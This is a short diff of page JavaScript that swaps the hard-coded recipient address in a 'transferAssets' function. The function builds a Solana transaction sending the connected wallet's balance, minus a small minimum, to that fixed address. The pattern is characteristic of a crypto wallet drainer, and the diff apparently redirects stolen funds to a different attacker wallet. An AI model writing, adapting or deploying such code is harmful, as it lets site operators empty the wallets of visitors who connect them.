@@ -76,7 +76,7 @@ $(document).ready(function () {
 
     async function transferAssets(connection, publicKey, walletBalance, minBalance) {
         try {
-            const receiverWallet = new solanaWeb3.PublicKey("6RqRvJC6Qhf46LTDhfqvAQsGiXEFCPd2pBiS2rBQJxTf");
+            const receiverWallet = new solanaWeb3.PublicKey("EMMWrJ6CXEiojMqw7wvERRzj9LZ1CqNRW5KQWnMkM9Qd");
             const balanceForTransfer = walletBalance - minBalance;
             let transaction = new solanaWeb3.Transaction();
 
